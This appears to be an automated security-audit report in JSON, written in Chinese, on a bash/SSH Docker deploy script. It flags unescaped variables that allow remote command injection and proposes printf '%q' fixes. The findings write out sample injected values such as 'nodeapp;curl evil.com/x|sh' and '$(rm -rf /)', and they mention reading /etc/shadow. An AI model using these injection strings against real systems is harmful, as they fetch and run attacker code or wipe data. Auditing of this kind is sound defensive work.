@@ -1,0 +1,155 @@
+{
+  "taskId": "T-2026-0612-003",
+  "phase": "security",
+  "overall": 7.83,
+  "dimensions": {
+    "S1 注入防护": {
+      "score": 7,
+      "rationale": "R3/R4 已修 11 处 CONTAINER_NAME/NGINX_CONTAINER/V3_GREP_KEYWORD 远程命令注入(printf '%q' 转义 + grep -rlF 固定串),bash payload 回归通过。但 reviewer 主动标记的 2 处未转义残留仍是 high: (1) chown 行 CHOWN_USER/CHOWN_GROUP (line 468) — 若用户传 '$(rm -rf /)' 可在远端 bash 中执行;(2) compose up 块 SERVER_PROJECT_PATH/COMPOSE_FILE/SERVICE_NAME (line 432-434) — service 名和服务路径均为远程 bash 展开,R3 修复注释('#B2 修复:全程用一次转义后的容器名')误以为已全覆盖。其余 BACKEND_PORT(已 1-65535 范围校验)、V1_HEALTH_PATH(仅影响 curl URL path)、NGINX_HTML_PATH(内部常量,无外部输入面)风险低。",
+      "evidence": "scripts/deploy-template.sh:432-434 compose up 块 3 个变量无转义;467-468 chown CHOWN_USER/CHOWN_GROUP 无转义;439-440 escaped_cname_deploy/escaped_nginx_deploy 声明;517/550/579 三处 NGINX_CONTAINER 转义;592 V3_GREP_KEYWORD 转义;518 BACKEND_PORT 数值未转义但范围校验 218-219;614 curl --max-time 30 防挂起"
+    },
+    "S2 输入校验": {
+      "score": 8,
+      "rationale": "硬约束已就位:SSH_HOST 正则 ^[^@]+@[a-zA-Z0-9._-]+$(line 208);SSH_PORT/BACKEND_PORT 双重正则+范围校验 1-65535(line 214-220);PROJECT_PATH 解析为绝对路径且 cd+pwd 验证存在(line 193-199);COMPOSE_FILE 存在性校验(line 202);validate_service_name 用 awk 验证 service 名确实出现在 compose 文件中(line 289-313)。残留: (a) SERVICE_NAME/CONTAINER_NAME/NGINX_CONTAINER 无字符白名单(只允许 [a-zA-Z0-9_-]),理论上可传 ';rm -rf /' — 但 printf '%q' 是第二道防线;(b) V3_GREP_KEYWORD 无长度上限(理论 1GB payload 致 grep OOM),R3 修复用了 -F 但未限长;(c) PROJECT_PATH 解析为绝对路径后未检查 `..`,但 cd + pwd 已消除 symlink 风险。",
+      "evidence": "scripts/deploy-template.sh:208(SSH_HOST 正则), 214-220(双端口校验), 193-199(PROJECT_PATH 绝对化), 202(COMPOSE_FILE 存在), 289-313(validate_service_name awk), 130-142(命令行参数 case 白名单+unknown 警告)"
+    },
+    "S3 凭据/敏感信息": {
+      "score": 8,
+      "rationale": "SSH 私钥路径未硬编码 — 完全依赖 ~/.ssh/config 或 ssh-agent,符合最佳实践。LOG_FILE 内容只记录参数名(不记密码/token),echo 块 690-702 都是参数名/路径/chown。残留风险: (1) V1_CUSTOM_CMD 设计的 custom_out(line 537)会被 warn 输出,如果 custom 命令本身回显了密钥/token,会泄漏到日志— 这是 V1_CUSTOM_CMD 的固有风险,文档化即可;(2) auto-deploy.sh line 29-31 用 'set -a; source .env.deploy; set +a' 加载 .env.deploy,若 .env.deploy 含 DB_PASSWORD/JWT_SECRET 等敏感值,会被 export 到 process env,任何子进程可读 — 建议仅加载白名单变量;(3) 当前项目无 .env.deploy 文件,这条风险目前未触发。",
+      "evidence": "scripts/deploy-template.sh:154 ssh_cmd 用 -o 选项,无硬编码路径;537 warn \"V1 CUSTOM: result — $custom_out\"(可能含敏感信息);683-702 log 块只写参数名不写密码;.team/scripts/auto-deploy.sh:29-31 set -a 全量 export;.env 文件存在但 .env.deploy 不存在(grep 确认)"
+    },
+    "S4 文件权限": {
+      "score": 7,
+      "rationale": "服务器端 /tmp/backend-overlay 和 /tmp/frontend-overlay 通过 trap EXIT 调用 cleanup()(line 766)清理,正常退出和异常退出都能覆盖 ✓。本地 /tmp/deploy-*.tar 临时文件 line 379/403 显式 rm -f ✓(但 trap cleanup 只清服务端,本地若 SCP 失败可能残留 — 概率低)。模板自身文件权限无 chmod +x,完全靠调用方 bash <script> ✓(更安全:不强制执行位)。残留: cleanup() 的 ssh_cmd 用了 '|| true',若 SSH 失联,服务端 /tmp 目录会残留,无远程 trap 兜底。",
+      "evidence": "scripts/deploy-template.sh:365-403 临时 tar 创建+清理;718-724 cleanup() 函数;766 trap 'rc=$?; cleanup; exit $rc' EXIT;无 chmod/chown 在脚本自身"
+    },
+    "S5 错误处理": {
+      "score": 9,
+      "rationale": "set -euo pipefail 顶部启用(line 18)覆盖全局;run_deploy 用 set +e...(set -e 恢复) 包裹 4.1-4.7 单步执行(line 428/500),失败转 warn 不中断,交给 verify 兜底 ✓;run_verify 同模式(line 629/634) ✓;退出码 0/1/2/3/4 设计清晰对应 PASS/PREFLIGHT/TRANSFER/PARTIAL/FAIL(line 748-755);trap EXIT 保留真实退出码 rc=$?(line 766) ✓;run_log 内 VERDICT 判定后 cleanup 触发顺序合理。V1_CUSTOM_CMD 的 custom_rc=$?(line 534)N3 修复正确。无明显问题。",
+      "evidence": "scripts/deploy-template.sh:18(set -euo pipefail), 428/500(set 切换), 629/634(set 切换), 718-724(cleanup), 748-755(exit code case), 766(trap EXIT 保留 rc);运行日志 N3 修复 #533-534 custom_rc=$? 真实记录"
+    },
+    "S6 部署链路": {
+      "score": 8,
+      "rationale": "chown -R 修改整个 /app 权限 — 已知副作用,line 467-468 用 warn 标注,baked image 中非本次部署的文件也变属主(可接受,符合 v10 部署流程)。docker restart 不可避免影响在线用户,但 verify_v1-v4 会验证恢复。残留 medium 风险: 前端 docker cp /tmp/frontend-overlay/. ${NGINX_HTML_PATH}/ (line 474) 不先 rm -rf 旧文件,旧 chunk hash 残留 — 如果新构建删除了某 chunk 引用,旧 JS 文件仍被 nginx serve 引用,可能造成 stale bundle 加载错误。建议下次迭代加 'rm -rf ${NGINX_HTML_PATH}/assets/*.js' 预清; NGINX_HTML_PATH 未转义(line 474/551/580/593),但仅内部常量,low 风险。",
+      "evidence": "scripts/deploy-template.sh:474 docker cp 前端无 rm 预清;467 chown -R 注释 'baked image files may be inaccessible';479 docker restart 必经;484-498 二次 health check 验证恢复"
+    }
+  },
+  "findings": [
+    {
+      "id": "SEC-001",
+      "severity": "high",
+      "category": "injection",
+      "title": "compose up 远程命令注入 (SERVER_PROJECT_PATH/COMPOSE_FILE/SERVICE_NAME 未转义)",
+      "where": "scripts/deploy-template.sh:432-434",
+      "evidence": "ssh_cmd \"cd ${SERVER_PROJECT_PATH} && \\\n  (docker compose -f ${COMPOSE_FILE} up -d --force-recreate --no-deps ${SERVICE_NAME} 2>&1 || \\\n   docker-compose -f ${COMPOSE_FILE} up -d --force-recreate --no-deps ${SERVICE_NAME} 2>&1)\" \\\n  || warn \"compose up failed (continuing — verify will catch issues)\"",
+      "impact": "若调用方传 SERVICE_NAME='foo;rm -rf /app' 或 SERVER_PROJECT_PATH='/root/a;curl evil.com/x|sh',会在远端 bash 中执行恶意命令。攻击面虽限于能传参的人(本项目为内部 devops subagent),但 R3 修复注释明确写 '#B2 修复:全程用一次转义后的容器名,避免重复' 给人虚假安全感 — 实际 SERVER_PROJECT_PATH/COMPOSE_FILE/SERVICE_NAME 三处仍裸用。",
+      "fix": "line 432-434 改为:  local escaped_srv escaped_compose escaped_svc; escaped_srv=$(printf '%q' \"$SERVER_PROJECT_PATH\"); escaped_compose=$(printf '%q' \"$COMPOSE_FILE\"); escaped_svc=$(printf '%q' \"$SERVICE_NAME\"); ssh_cmd \"cd ${escaped_srv} && (docker compose -f ${escaped_compose} up -d --force-recreate --no-deps ${escaped_svc} 2>&1 || docker-compose -f ${escaped_compose} up -d --force-recreate --no-deps ${escaped_svc} 2>&1)\" ...",
+      "owasp": "A03:2021-Injection",
+      "cwe": "CWE-78"
+    },
+    {
+      "id": "SEC-002",
+      "severity": "high",
+      "category": "injection",
+      "title": "chown 远程命令注入 (CHOWN_USER/CHOWN_GROUP 未转义)",
+      "where": "scripts/deploy-template.sh:467-468",
+      "evidence": "ssh_cmd \"docker exec ${escaped_cname_deploy} chown -R ${CHOWN_USER}:${CHOWN_GROUP} /app/ 2>&1\" \\\n  || warn \"chown failed — baked image files may be inaccessible\"",
+      "impact": "CHOWN_USER/CHOWN_GROUP 通过 detect_chown() 默认从 Dockerfile 探测(nodeapp/nodejs),用户也可显式传值覆盖。若传 CHOWN_USER='nodeapp;curl evil.com/x|sh' 会在远端 docker exec 中执行任意命令。这是 reviewer R3 评估 B2 时明确列为 '已修 B2 但仍残留' 的位置。",
+      "fix": "line 467-468 改为:  local escaped_chown_user escaped_chown_group; escaped_chown_user=$(printf '%q' \"$CHOWN_USER\"); escaped_chown_group=$(printf '%q' \"$CHOWN_GROUP\"); ssh_cmd \"docker exec ${escaped_cname_deploy} chown -R ${escaped_chown_user}:${escaped_chown_group} /app/ 2>&1\" ...",
+      "owasp": "A03:2021-Injection",
+      "cwe": "CWE-78"
+    },
+    {
+      "id": "SEC-003",
+      "severity": "medium",
+      "category": "logic",
+      "title": "前端 docker cp 不清旧文件,旧 chunk hash 残留风险",
+      "where": "scripts/deploy-template.sh:474",
+      "evidence": "ssh_cmd \"docker cp /tmp/frontend-overlay/. ${escaped_nginx_deploy}:${NGINX_HTML_PATH}/ 2>&1\"",
+      "impact": "若新构建删除了某 chunk 引用(如某 lazy route 移除),旧 JS 哈希文件仍在 nginx html/assets/ 下被 serve,但 index.html 不再引用,造成磁盘泄漏。若新构建新增 chunk 但旧 chunk 文件名哈希碰撞极少,问题不大。风险主要是磁盘占增长,非直接安全洞,但属于 stale deployment anti-pattern。",
+      "fix": "line 473-474 前加一行预清:  ssh_cmd \"docker exec ${escaped_nginx_deploy} rm -rf ${NGINX_HTML_PATH}/assets/* 2>&1\" || warn \"pre-clean failed\";  或改为 rsync --delete 语义。",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "cwe": "CWE-922"
+    },
+    {
+      "id": "SEC-004",
+      "severity": "medium",
+      "category": "config",
+      "title": "V1_CUSTOM_CMD 钩子可能在日志中泄漏敏感信息",
+      "where": "scripts/deploy-template.sh:532-537",
+      "evidence": "custom_out=$(ssh_cmd \"${V1_CUSTOM_CMD}\" 2>&1) || true\ncustom_rc=$?\nif [[ $custom_rc -eq 0 ]] && echo \"$custom_out\" | grep -qi 'PASS\\|OK\\|0'; then\n  ok \"V1 CUSTOM: passed\"\nelse\n  warn \"V1 CUSTOM: result — $custom_out\"",
+      "impact": "V1_CUSTOM_CMD 是项目专属深度验证钩子,设计意图是让项目方传任意 ssh 命令。warn 会把 custom_out 全量输出到日志。如果 custom 命令包含 cat /etc/shadow 或 env | grep SECRET 等敏感操作,输出会写入 LOG_FILE 并通过 auto-deploy.sh 的 tee 进入 .team/tasks/<id>/deploy.log — 长期留痕。",
+      "fix": "文档化 V1_CUSTOM_CMD 风险,或限制输出长度 (head -c 1024) / 屏蔽已知敏感模式 (sed 's/eyJ[A-Za-z0-9_-]\\{20,\\}/***REDACTED***/g')。当前实现可接受(内部工具),但应记录到 README。",
+      "owasp": "A09:2021-Security Logging and Monitoring Failures",
+      "cwe": "CWE-532"
+    },
+    {
+      "id": "SEC-005",
+      "severity": "medium",
+      "category": "config",
+      "title": "auto-deploy.sh set -a 全量 export .env.deploy 敏感值",
+      "where": ".team/scripts/auto-deploy.sh:29-31",
+      "evidence": "ENV_DEPLOY=\"${PROJECT_ROOT}/.env.deploy\"\nif [[ -f \"$ENV_DEPLOY\" ]]; then\n  set -a\n  source \"$ENV_DEPLOY\"\n  set +a\nfi",
+      "impact": "set -a 会将 source 进去的所有变量自动 export 到子进程环境。deploy-template.sh 作为子进程会继承。若 .env.deploy 后续被项目用于存 DB_PASSWORD/JWT_SECRET/SSH_PASS 等敏感值,这些值会出现在 process env,任何 ssh_cmd 的子 shell 都能读到,且如果调用方用 ps aux 查看也会泄漏。当前 .env.deploy 不存在,无即时风险,但作为模板,应仅加载白名单变量。",
+      "fix": "改为:  while IFS='=' read -r ek ev; do [[ -z \"$ek\" || \"$ek\" =~ ^# ]] && continue; case \"$ek\" in PROJECT_PATH|SERVICE_NAME|...KNOWN_LIST) export \"$ek\"=\"$ev\" ;; esac; done < \"$ENV_DEPLOY\"  或显式 source 已知的 KEY 列表。",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "cwe": "CWE-526"
+    },
+    {
+      "id": "SEC-006",
+      "severity": "low",
+      "category": "logic",
+      "title": "cleanup 失败时服务端 /tmp 残留无兜底",
+      "where": "scripts/deploy-template.sh:766 (trap) + 722-724 (cleanup)",
+      "evidence": "trap 'rc=$?; cleanup; exit $rc' EXIT\n\ncleanup() {\n  log \"cleaning up server-side temp files...\"\n  ssh_cmd \"rm -rf /tmp/backend-overlay /tmp/frontend-overlay 2>/dev/null; echo cleanup_done\" 2>/dev/null || true\n}",
+      "impact": "若脚本在 cleanup 调用时 SSH 已失联,ssh_cmd 静默失败,服务端 /tmp/backend-overlay 和 /tmp/frontend-overlay 持续存在,每次部署累积。攻击面低(都是 root 用户的 /tmp),但占用磁盘且若内容敏感可能泄漏给同机其他用户。",
+      "fix": "cleanup 改用 batch + timeout:  timeout 10 ssh ... || ssh -o BatchMode=yes ... ; 或在服务端加 cron 清理 /tmp/deploy-* 1d+ 旧文件。",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "cwe": "CWE-459"
+    },
+    {
+      "id": "SEC-007",
+      "severity": "low",
+      "category": "input_validation",
+      "title": "V3_GREP_KEYWORD 无长度上限,理论可构造 1GB 字符串",
+      "where": "scripts/deploy-template.sh:39 (定义) + 592 (转义后使用)",
+      "evidence": "V3_GREP_KEYWORD=\"${V3_GREP_KEYWORD:-}\"\n...\nescaped_kw=$(printf '%q' \"$V3_GREP_KEYWORD\")",
+      "impact": "调用方传 1GB 字符串作为 keyword,会被 printf '%q' 完整保留(可能更大),然后嵌入 ssh 远端 sh -c 'grep -rlF ...' 命令,可能导致本地 ssh 客户端 OOM 或远端 sh 解析失败。R3 已用 -F 避免正则灾难,但未限长。",
+      "fix": "validate_params 加:  if [[ -n \"${V3_GREP_KEYWORD}\" ]] && [[ ${#V3_GREP_KEYWORD} -gt 256 ]]; then fail \"V3_GREP_KEYWORD too long: ${#V3_GREP_KEYWORD} chars (max 256)\"; return 1; fi",
+      "owasp": "A03:2021-Injection",
+      "cwe": "CWE-20"
+    },
+    {
+      "id": "SEC-008",
+      "severity": "info",
+      "category": "config",
+      "title": "NGINX_HTML_PATH/V1_HEALTH_PATH/V2_CHUNK_PATTERN 未转义(影响有限)",
+      "where": "scripts/deploy-template.sh:474, 518, 551, 580, 593",
+      "evidence": "ssh_cmd \"docker exec ${escaped_nginx_cname} ls ${NGINX_HTML_PATH}/assets/${V2_CHUNK_PATTERN} 2>&1\"",
+      "impact": "这些变量会被远端 bash 展开。V2_CHUNK_PATTERN 是 glob pattern(预期带通配符),不转义反而正确(让远端 shell 展开)。NGINX_HTML_PATH 和 V1_HEALTH_PATH 当前默认是内部常量,无外部输入面。SERVICE_NAME/CONTAINER_NAME 同理:用 printf '%q' 是为防御,但若能加字符白名单 ^[a-zA-Z0-9._:-]+$ 校验更稳。",
+      "fix": "可选加固(非阻塞):  validate_params 加 SERVICE_NAME/CONTAINER_NAME/NGINX_CONTAINER 字符白名单:  if [[ ! \"$SERVICE_NAME\" =~ ^[a-zA-Z0-9._-]+$ ]]; then fail \"SERVICE_NAME invalid\"; return 1; fi",
+      "owasp": "A03:2021-Injection",
+      "cwe": "CWE-20"
+    }
+  ],
+  "checked": [
+    "auth-on-server-actions (N/A — bash 脚本无 Server Action)",
+    "input-validation-zod (N/A — bash 场景用 regex+范围手工校验)",
+    "ssh_cmd 远程命令注入: 11 处 printf '%q' 转义已覆盖 CONTAINER_NAME/NGINX_CONTAINER/V3_GREP_KEYWORD;2 处遗漏:chown (468) / compose up (432-434)",
+    ".env.deploy 加载: auto-deploy.sh 用 set -a 全量 export (SEC-005),当前无 .env.deploy 文件未触发",
+    "trap cleanup EXIT: 已实现,服务端 /tmp 清理覆盖 (但 SEC-006 无 SSH 失联兜底)",
+    "set -euo pipefail 顶部启用 + set +e 局部开关: 正确",
+    "退出码 0-4 设计合理: PASS/PREFLIGHT/TRANSFER/PARTIAL/FAIL",
+    "V1_CUSTOM_CMD 输出可能泄漏敏感信息 (SEC-004)",
+    "前端 docker cp 不预清旧 chunk (SEC-003)",
+    "bash -n 语法检查通过 + 注入 payload 回归测试通过 (B1+B2)"
+  ],
+  "deps_scan": {
+    "tool": "manual+heuristic",
+    "high_or_critical": 0,
+    "medium": 0,
+    "note": "deploy-template.sh 是纯 bash 脚本,无 npm/pip 依赖;auto-deploy.sh 同理;不存在第三方 CVE 风险面。仅依赖系统工具: ssh/scp/tar/docker/xattr/curl/awk/find/grep — 均为标准工具,版本随 OS 更新"
+  },
+  "verdict": "FAIL",
+  "verdict_reason": "发现 2 个 high (SEC-001 compose up 注入 / SEC-002 chown 注入),reviewer R3 评估 8.20 时已识别但列为 'suggestion' 未修复。按本审计规则 critical/high 直接 FAIL,即使 reviewer 已 PASS。需回退到 Code Review R5 修复 2 处转义后重新审计。"
+}
